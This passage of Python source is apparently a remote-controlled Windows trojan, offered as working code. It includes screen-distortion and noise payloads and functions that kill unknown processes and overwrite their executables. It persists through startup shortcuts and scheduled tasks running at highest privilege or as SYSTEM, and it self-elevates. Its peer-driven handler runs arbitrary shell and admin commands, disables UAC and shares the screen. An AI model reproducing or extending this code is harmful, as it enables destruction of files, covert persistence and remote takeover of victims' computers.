            video = driver.find_element(By.TAG_NAME, "video")
            skipadbutton()
            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
            print("End time:", end_time)
            if detectifpause():
                play()
            if end_time != vid_length:
                wait3sec = time.time() + 3
                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
                print("Ad detected, skipping...")
            elif time.time() > wait3sec:
                print("No ad detected, continuing...")
                tryandretryuntilwork("arguments[0].currentTime = 0", video)
                break
        except selenium.common.exceptions.StaleElementReferenceException:
            print("Stale element reference exception occurred. Trying to find the video element again.")
            continue
        time.sleep(1)

    def simulate_user_interaction():
        """Simulates user interaction with the YouTube video."""
        actions = ActionChains(driver)
        actions.send_keys('f')  # Full screen using 'f' key
        actions.perform()
        time.sleep(1)

 

    setytvolume(0.5)

    maximize_process_via_name('chrome.exe')
    unmute() 
    simulate_user_interaction()  # Enter full-screen
    while detectifpause():
        play()
        time.sleep(0.8)
    setytvolume(1)
    print('Skipped all ads, or there were just no ads.. ')
    unmute()  # Unmute after ad-skipping

    if starttime is not None:
        setYTtime(starttime)
    else:
        setYTtime(0)

    if endingtime is not None:
        while getcurrentYTtime() < endingtime:
            time.sleep(0.1)
            print(getcurrentYTtime())
    else:
        while getcurrentYTtime() < end_time - 2.5:
            time.sleep(1)

    driver.quit() 
    # no need to unset always on top here, as the driver kills it
    enable_keyboard()
    enable_mouse()

def playYTvidinbackground(video_url, starttime=None, endingtime=None):
    """Plays a YouTube video in the background."""
    try:
        if starttime == '':
            starttime = None
    except: 
        starttime = None
        
    try: 
        if endingtime == '':
            endingtime = None
    except:
        endingtime = None
    if not video_url:
        print("No video URL provided.")
        return
    print(f"Playing video in the background, URL: {video_url}, Start: {starttime}, End: {endingtime}")

    def get_youtube_video_duration(video_url):
        """Gets the duration of a YouTube video."""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(video_url, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Failed to load page: {response.status_code}")
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if 'ytInitialPlayerResponse' in script.string if script.string else '':
                script_content = script.string
                break
        else:
            raise Exception("Couldn't find ytInitialPlayerResponse in the page")
        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
        if not duration_match:
            raise Exception("Couldn't find video duration in the page")
        duration_ms = int(duration_match.group(1))
        duration_seconds = duration_ms / 1000
        return duration_seconds

    vid_length = math.floor(get_youtube_video_duration(video_url))
    print(f'Specified video length is: {vid_length}')
    if endingtime is not None and endingtime > vid_length:
        print("ending time is more than the vid time, error.")
        return False, "endingtime>vidlength"
    if starttime is not None and starttime > vid_length:
        print("starting time is more than the vid time, error.")
        return False, "starttime>vidlength"

    def tryandretryuntilwork(*args):
        """Retries a function call until it succeeds."""
        def run():
            return driver.execute_script(*args)
        while True:
            try:
                return run()
            except Exception as e:
                print(e)
                time.sleep(0.5)
                continue

    def skipadbutton():
        """Skips YouTube ads if present."""
        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0
        print(f'Does the skip button exist? {skip_button_exists}')
        if skip_button_exists:
            skip_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
            )
            skip_button.click()

    def getcurrentYTtime():
        """Gets the current playback time of the YouTube video."""
        return tryandretryuntilwork("return arguments[0].currentTime", video)

    def play():
        """Plays the YouTube video."""
        tryandretryuntilwork("arguments[0].play()", video)
        print("playing...")

    def pause():
        """Pauses the YouTube video."""
        tryandretryuntilwork("arguments[0].pause()", video)
        print("pausing...")

    def detectifpause():
        """Checks if the YouTube video is paused."""
        return tryandretryuntilwork("return arguments[0].paused", video)

    def detectifmuted():
        """Checks if the YouTube video is muted."""
        return tryandretryuntilwork("return arguments[0].muted", video)

    def mute():
        """Mutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = true", video)
        print("muting...")

    def unmute():
        """Unmutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = false", video)
        print("unmuting...")

    def setytvolume(volume):
        """Sets the volume of the YouTube video."""
        if volume > 1:
            volume = volume / 100
        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
        print("Changing volume...")

    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
    print(f'Webdriver location: {webdriver_path}')
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)
    driver.get(video_url)
    wait = WebDriverWait(driver, 15)
    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))
    if not detectifmuted():
        mute()

    def setYTtime(time):
        """Sets the playback time of the YouTube video."""
        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
        print("Changing playback time...")

    def simulate_user_interaction():
        """Simulates user interaction with the YouTube video."""
        actions = ActionChains(driver)
        actions.move_to_element(driver.find_element(By.TAG_NAME, 'body')).click().perform()
        time.sleep(1)
        actions.move_to_element(video).click().perform()
        time.sleep(1)
        actions.send_keys(Keys.SPACE).perform()
        time.sleep(1)

    if not detectifmuted():
        mute()
    simulate_user_interaction()
    if not detectifmuted():
        mute()
    wait3sec = time.time() + 3
    while True:
        try:
            video = driver.find_element(By.TAG_NAME, "video")
            skipadbutton()
            if not detectifmuted():
                mute()
            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
            print("End time:", end_time)
            if detectifpause():
                play()
            if end_time != vid_length:
                wait3sec = time.time() + 3
                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
                print("ad detected, skipping...")
            elif time.time() > wait3sec:
                print("no ad detected, continuing...")
                tryandretryuntilwork("arguments[0].currentTime = 0", video)
                break
        except selenium.common.exceptions.StaleElementReferenceException:
            print("Stale element reference exception occurred. Trying to find the video element again.")
            continue
        time.sleep(1)
    while detectifpause():
        play()
        time.sleep(0.8)
    setytvolume(1) 
    print('skipped all ads, or there were just no ads.. ')
    if detectifmuted():
        unmute()
    if starttime is not None:
        setYTtime(starttime)
    else:
        setYTtime(0)
    if endingtime is not None:
        while getcurrentYTtime() < endingtime:
            time.sleep(0.1)
            print(getcurrentYTtime())
    if endingtime is None:
        while getcurrentYTtime() < end_time - 2.5: 
            time.sleep(1)
    driver.quit() 

def payload_4():
    """Executes a visual and audio payload with screen distortions and sounds."""
    hdc = win32gui.GetDC(0)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 60     
    min_interval = 3    
    max_interval = 7     
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        x1 = randint(0, screen_width)
        y1 = randint(0, screen_height)
        x2 = randint(0, screen_width)
        y2 = randint(0, screen_height)
        w1 = randint(1, screen_width)
        h1 = randint(1, screen_height)
        w2 = randint(1, screen_width)
        h2 = randint(1, screen_height)
        win32gui.StretchBlt(hdc, x1, y1, w1, h1, hdc, x2, y2, w2, h2, win32con.SRCCOPY)
        interval = randint(min_interval, max_interval)
        color = random.choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
        brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
        win32gui.FillRect(hdc, (0, 0, screen_width, screen_height), brush)
        play_tone(100, 100)
        play_shepard_tone(10, 100, 1)
        play_tone(1000, 10)
        time.sleep(interval)

def payload_5():
    """Plays annoying system sounds and displays an error message."""
    timeout = 7 

    def amtxuif():
        """Displays an error message box."""
        MessageBox = ctypes.windll.user32.MessageBoxW
        MessageBox(None, "An error has occurred", "Error", 0x40 | 0x1)

    threading.Thread(target=amtxuif).start()

    def awhiletrue():
        """Plays a system sound in a loop."""
        while True:
            winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
            slp(1.3)

    def bwhiletrue():
        """Plays a system sound in a loop."""
        while True:
            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
            slp(0.04)

    def abcd():
        """Starts threads for playing sounds."""
        threading.Thread(target=awhiletrue).start()
        slp(0.5)
        threading.Thread(target=bwhiletrue).start()

    timeout_start = time.time()
    abcd()
    while time.time() < timeout_start + timeout:
        pass

def payload_6():
    """Continuously inverts the screen colors."""
    hdc = win32gui.GetDC(0)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 10
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.NOTSRCCOPY)
        gray_dc = win32gui.CreateCompatibleDC(hdc)
        bitmap = win32gui.CreateCompatibleBitmap(hdc, screen_width, screen_height)
        win32gui.SelectObject(gray_dc, bitmap)
        win32gui.BitBlt(gray_dc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.SRCCOPY)
        brush = win32gui.CreateSolidBrush(0)
        win32gui.FillRect(gray_dc, (0, 0, screen_width, screen_height), brush)
        win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, gray_dc, 0, 0, win32con.SRCCOPY)
        win32gui.DeleteDC(gray_dc)

def restartToUAC():
    """Restarts the script with UAC privileges if not already running as admin."""
    if not admin_privileges:
        print('Restarting to obtain UAC perms')
        run_command_as_admin(f'start {os.path.join(get_script_directory(), get_script_filename())}')
        kill_self()
    else:
        print('Already have UAC perms, no need in a restart')

def keepalive():
    """Sends keep-alive messages to connected devices to maintain connections."""
    global timeout_device_list, varyhosts
    while True:
        currentTime = time.time()
        if not varyhosts:
            slp(1)
        else:
            for hostAddr in varyhosts:
                if hostAddr in timeout_device_list:
                    if timeout_device_list[hostAddr] > currentTime:
                        if (timeout_device_list[hostAddr] + 60) > currentTime:
                            print(f'Device timed out: ', hostAddr)
                            varyhosts.remove(hostAddr)
                            del timeout_device_list[hostAddr]
                        else:
                            send(hostAddr, "Keepalive")
                            print('sent keep alive to', hostAddr)
                else:
                    print('adding to list,', hostAddr)
                    timeout_device_list[hostAddr] = time.time() + 60
            print('keepalive to do,', timeout_device_list)
            slp(25)
            
            


def freeze_unknown_processes():
    """Freezes unknown processes to effectively freeze Windows."""
    print(f'Initiating freeze unknown process')
    tokill = []
    exclude_list = [
        "powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe",
        "GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe",
        "csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system",
        "wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe",
        "msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 
        'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 
        'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 
        'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 
        'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 
        'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 
        'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 
        'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 
        'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 
        'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 
        'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 
        'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 
        'SecurityHealthSystray.exe', 'System', 'services.exe'
    ]
    exclude_list = [x.lower() for x in exclude_list]
    exclude_list_HAVE = [
        "System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", 
        "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE",
        "GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"
    ]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    exclude_list_HAVE = exclude_list_HAVE + exclude_list
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    def getchildrenofprocess(pid):
        """Gets the child processes of a given process."""
        process = psutil.Process(pid)
        for child in process.children(recursive=True):
            add(child.pid)

    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())

    def add(pid, children=False):
        """Adds a process ID to the list of processes to kill."""
        if pid != ownprogrampid and pid != ownprogramparrentpid:
            if children:
                getchildrenofprocess(pid)
            if pid not in tokill:
                tokill.append(pid)

    processes = psutil.process_iter()
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    for process in processes:
        try:
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.replace('\\', '/').replace('//', '/'):
                continue
            if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                pass
            elif name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                pass
            elif pid not in lsttocheck:
                add(pid)
        except Exception as e:
            pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia not in exclude_list_HAVE:
            newlisttokill.append(i)
    tokill = newlisttokill 
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            continue
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid or pid in lsttocheck:
            continue
        try:
            proc = psutil.Process(pid)
            if len(proc.cmdline()) > 1:
                vrsproc = proc.cmdline()[1]
            else:
                vrsproc = proc.cmdline()[0]
            if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                continue
            psutil.Process(pid).suspend()
        except Exception as e:
            pass




def terminate_unknown_processes(corrupt=True):
    """Terminates and optionally corrupts unknown processes."""
    print(f'Initiating a terminate unknown process')
    tokill = []
    exclude_list = [
        "powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe",
        "GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe",
        "csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system",
        "wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe",
        "msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 
        'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 
        'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 
        'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 
        'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 
        'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 
        'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 
        'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 
        'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 
        'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 
        'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 
        'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 
        'SecurityHealthSystray.exe', 'System', 'services.exe'
    ]
    exclude_list = [x.lower() for x in exclude_list]
    exclude_list_HAVE = [
        "System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", 
        "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE",
        "GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"
    ]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    def corruptfile(directoryoffile):
        """Corrupts a file by overwriting its content with 'X' characters."""
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()

    def getchildrenofprocess(pid):
        """Gets the child processes of a given process."""
        process = psutil.Process(pid)
        for child in process.children(recursive=True):
            add(child.pid)

    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())

    def add(pid, children=False):
        """Adds a process ID to the list of processes to kill."""
        if pid != ownprogrampid and pid != ownprogramparrentpid:
            if children:
                getchildrenofprocess(pid)
            if pid not in tokill:
                tokill.append(pid)

    processes = psutil.process_iter()
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    for process in processes:
        try:
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.replace('\\', '/').replace('//', '/'):
                continue
            if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                pass
            elif name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                pass
            elif pid not in lsttocheck:
                add(pid)
        except Exception as e:
            pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia not in exclude_list_HAVE:
            newlisttokill.append(i)
    tokill = newlisttokill 
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            continue
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid or pid in lsttocheck:
            continue
        try:
            proc = psutil.Process(pid)
            if len(proc.cmdline()) > 1:
                vrsproc = proc.cmdline()[1]
            else:
                vrsproc = proc.cmdline()[0]
            if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                continue
            psutil.Process(pid).kill()
        except Exception as e:
            pass

    if corrupt:
        for location in pid_locations:
            try:
                corruptfile(location) 
            except Exception as e:
                pass

def sendAllVaryHosts(text):
    """Sends a message to all connected vary hosts."""
    global varyhosts
    varyhosts = list(set(varyhosts)) 
    for i in varyhosts:
        send(i, text)

def addselftostartup_reg():
    """Adds the script to the Windows registry to run on startup (requires admin rights)."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        os.rmdir(startup_folder)
    except:
        pass
    # v0 is hard set because of duplicates.. so it'll just cause old revisions not work
    run_command_as_admin(f'schtasks /create /sc ONLOGON /tn "v0" /tr "{os.path.join(get_script_directory(), get_script_filename())}" /ru {os.getlogin()} /rl HIGHEST /it /f')

def addselftostartup_folder():
    """Adds the script to the startup folder."""
    script_dir = get_script_directory()
    script_filename = get_script_filename()
    script_path = os.path.join(script_dir, script_filename)
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    make_shortcut(script_path, name=script_filename, terminal=False, folder=startup_folder)

def self_tostartup():
    """Adds the script to startup using the appropriate method based on privileges."""
    if admin_privileges:
        addselftostartup_reg()
    else:
        addselftostartup_folder()

def create_presitent_starting():
    """Creates a persistent task in Windows Task Scheduler to run the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    task_name = "flWin32"
    command = exe_path
    trigger = "/tr 00000005"
    subprocess.check_output(
        [
            "schtasks",
            "/create",
            "/tn",
            task_name,
            "/tr",
            command,
            "/sc",
            trigger,
        ]
    )

def self_to_rerun_if_killed():
    """Creates a task to rerun the script if it's killed."""
    program_path = os.path.join(get_script_directory(), get_script_filename())
    task_name = "flWin86s"
    event_id = 20225
    event_channel = "System"
    os.system(f'schtasks /Create /TN "{task_name}" /TR "{program_path}" /SC ONEVENT /MO "*[System[EventID={event_id}]]" /EC {event_channel} /RU SYSTEM /F')
    os.system(f'schtasks /Run /TN "{task_name}"')

def inviscurr(duration, setdelay=5):
    """Hides the currently focused window for a specified duration."""
    a = time.time() + int(duration)
    while time.time() < a:
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
        slp(setdelay)

def swaprmbandlmbtrue():
    """Swaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(True)

def unswaprmbandlmb():
    """Unswaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(False)

def swapRMBAndLMB(aset='unspecified'):
    """Swaps or unswaps the left and right mouse buttons."""
    SM_SWAPBUTTON = 23
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    if aset == 'unspecified':
        if swapped:
            print('not Swapped rmb and lmb')
            SwapMouseButton(False)
        else:
            print('swapped rmb and lmb')
            SwapMouseButton(True)
    elif aset is True:
        SwapMouseButton(True)
        print('Set swap True')
    elif aset is False:
        SwapMouseButton(False)
        print('Set swap False')
    else:
        print(f'{aset} is not a valid option @ swapRMBAndLMB')

def type_string_with_human_delay(string):
    """Types a string with human-like delays between characters."""
    for character in string:
        if character == ' ':
            if random.random() < 0.8:
                slp(random.choice([0.2, 0.5, 0.1, 0.1, 0.2, 0.3, 0.4]))
        pynput.keyboard.Controller().type(character)
        slp(random.uniform(0.2, 0.03))

def webhandler(website):
    """Opens a website in the default browser."""
    runcmd(f'start chrome "{website}"')

def formatproperlyipv4(scrmbl):
    """Formats a string of IPv4 addresses."""
    global prioritizeipv4
    scrmbl = scrmbl.replace(' ', '')
    scrmbl = scrmbl.split(',') if ',' in scrmbl else [scrmbl]
    scrmbl = list(set(scrmbl)) 
    scrmbl = list(filter(None, scrmbl))
    prioritizeipv4 = scrmbl

def decrypt_msg(msg, key=b'placeholder'):
    """Decrypts a message using AES."""

    def encrypt(key, plaintext):
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')

    def decrypt(key, ciphertext):
        """Decrypts the ciphertext using AES."""
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')

    TUTKEYPHONE = key
    try:
        msg = str(msg.decode('utf-8'))                    
        msg = ast.literal_eval(msg)
        plaintext = decrypt(TUTKEYPHONE, msg)
        text = plaintext.decode("utf-8")
        return text
    except Exception as e:
        print(f'Error when decrypting text: {e}')
        return False

def encrypt_msg(msg, key=rb'placeholder'):
    """Encrypts a message using AES."""

    def encrypt(key, plaintext):
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')

    def decrypt(key, ciphertext):
        """Decrypts the ciphertext using AES."""
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')

    TUTKEYPHONE = key
    try:
        message = (encrypt(TUTKEYPHONE, msg))
        message = str(message).encode('utf-8')
        message = bytes(message)
        return message
    except Exception as e:
        print(f'Error when encrypting text: {e}')
        return False


def convert_mp4_to_wav_process_task(src_path, dst_path, result_queue): # RENAMED, and now takes result_queue
    """Extracts the audio track from an MP4 file and saves it as a WAV file with improved quality, returns result via queue."""
    print("[Child Process] Conversion task started for:", src_path) # <<<--- ENTRY POINT DEBUG PRINT

    try: # try block still here, good
        print("[Child Process] Opening source file:", src_path) # <<<--- DEBUG PRINT - FILE OPEN START
        # Open the source file
        container = av.open(src_path)
        print("[Child Process] Source file opened successfully.") # <<<--- DEBUG PRINT - FILE OPEN SUCCESS

        # Find the audio stream
        audio_stream = None
        for stream in container.streams:
            if stream.type == 'audio':
                audio_stream = stream
                break

        if audio_stream is None:
            raise ValueError("No audio stream found in the MP4 file.")

        # Target audio parameters for high quality
        target_sample_rate = 48000  # High quality sample rate
        target_layout = 'stereo'  # Force stereo output

        # Configure the stream
        audio_stream.codec_context.sample_rate = target_sample_rate
        audio_stream.codec_context.layout = target_layout

        # Initialize resampler
        resampler = av.AudioResampler(
            format=av.AudioFormat('s16').packed,
            layout=target_layout,
            rate=target_sample_rate
        )

        print("[Child Process] Opening WAV file for writing:", dst_path) # <<<--- DEBUG PRINT - WAV OPEN START
        # Open WAV file
        with wave.open(dst_path, 'wb') as wav_file:
            print("[Child Process] WAV file opened successfully.") # <<<--- DEBUG PRINT - WAV OPEN SUCCESS
            wav_file.setnchannels(2)  # Stereo
            wav_file.setsampwidth(2)  # 16-bit depth
            wav_file.setframerate(target_sample_rate)

            print("[Child Process] Decoding and writing audio frames...") # <<<--- DEBUG PRINT - DECODE START
            # Decode and write audio frames
            for frame in container.decode(audio_stream):
                # Resample frame
                resampled_frames = resampler.resample(frame)
                for resampled in resampled_frames:
                    # Convert to numpy array with improved precision
                    samples = resampled.to_ndarray()

                    # Normalize audio levels
                    if samples.dtype == np.float32:
                        samples = np.clip(samples, -1.0, 1.0)
                        samples = (samples * 32767).astype(np.int16)
                    else:
                        samples = samples.astype(np.int16)

                    # Write frames
                    wav_file.writeframes(samples.tobytes())
            print("[Child Process] Decoding and writing audio frames completed.") # <<<--- DEBUG PRINT - DECODE END

        # Close the container
        container.close()
        print("[Child Process] Source container closed.") # <<<--- DEBUG PRINT - CONTAINER CLOSED

        success_message = f"Successfully converted '{src_path}' to '{dst_path}'."
        print(success_message) # still print success in child process
        result_queue.put((True, success_message)) # put success and message in queue, yo
        print("[Child Process] Result put in queue, process exiting normally.") # <<<--- DEBUG PRINT - EXIT SUCCESS
        return # no need to return anything directly anymore

    except Exception as e: # error handling still lit
        error_message = f"Error converting '{src_path}' to WAV in child process: {e}" # detailed error msg
        print(error_message) # still print error in child process for logs
        result_queue.put((False, error_message)) # put fail and error msg in queue
        print("[Child Process] Error encountered, result put in queue, process exiting with error.") # <<<--- DEBUG PRINT - EXIT ERROR
        return # no direct return needed
    
    
def handle_messages_varyhost(msg, addr, conn):
    """Handles messages received from vary hosts."""
    global timeout_device_list, varyhosts
    unmodified_msg = msg
    ip, port = addr
    print("addr of handle_messages, ", addr)
    if msg == "SystemStartupIAmAVaryHost":
        print(f'New address called!, adding {ip}:{vary_PORT} to the varyhosts list')
        varyhosts.append(f'{ip}:{vary_PORT}')
    if msg == "Keepalive":
        timeout_device_list[addr] = time.time() + 60
    if msg == r'RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))':
        send((ip, vary_PORT), 'True')
        print('Request to share screen this device, accepted.')
        global running_ss, server
        running_ss = True
        host_ss((ip, int(vary_PORT)))
        print('Request to share screen this device has ended')
    if "REQUESTSENDALLHOSTCONTINUEONMESSAGE" in msg and "XR~=3yy=[W2vc%L" in msg:
        id, ip, identifier, todo = msg.split('XR~=3yy=[W2vc%L')
        if identifier in done_vary_tasks:
            print("I've already done this todo, so ignoring it, " + todo)
            return
        done_vary_tasks.append(identifier)
        sendAllVaryHosts(unmodified_msg)
        print(f"Got a todo from {ip}, it said to do: {todo} with an identifier of {identifier}")

def handle_connection_of_connected_device(msg, addr, conn):
    """Handles connections and commands from connected devices."""
    spltr = "OD2tIzZNuOHBqnu"
    task = 'undefined'
    information_msg = None
    handler = None
    if spltr in msg:
        tmpls = msg.split(spltr)
        tmpls += [None] * (4 - len(tmpls))
        tmpls = [None if i == "" else i for i in tmpls]
        print(tmpls)
        task, information_msg, handler = tmpls[:3]
    else:
        task = msg
    if task is not None:
        task = task.lower()
    global autoterminateunknownexeprocesses, prioritizeipv4
    information_msg_beforelower = information_msg
    if task == 'clearprioritize':
        prioritizeipv4 = None
    elif task == 'ipv4prioritize' and information_msg is not None:
        formatproperlyipv4(information_msg)
    elif task == 'makethescreendorotations' and information_msg is not None:
        makethescreendorotations(information_msg)
    elif task == 'undefined':
        return False    
    elif task == 'runcmd' and information_msg is not None:
        runcmd(information_msg)
    elif task == 'run_command_as_admin' and information_msg is not None:
        run_command_as_admin(information_msg)
    elif task == 'blackenscreen' and information_msg is not None:
        blackenscreen(information_msg)
    elif task == 'texttospeech' and information_msg is not None:
        texttospeech(information_msg_beforelower)
    elif task == 'speakxlanguage' and information_msg is not None:
        speakXlanguage(information_msg_beforelower)
    elif task == 'disableuseraccountcontrol':
        disableUserAccountControl()
    elif task == 'enableuseraccountcontrol':
        enableUserAccountControl()
    elif task == 'swappedswaprmbandlmb':  
        swaprmbandlmbtrue()
    elif task == 'nuke_all_hives':
        nuke_all_hives()
    elif task == 'unswappedswaprmbandlmb':
        unswaprmbandlmb()
    elif task == 'typestringwithhumandelay' and information_msg is not None:
        type_string_with_human_delay(information_msg)
    elif task == 'sendallhostsatodo' and information_msg is not None:
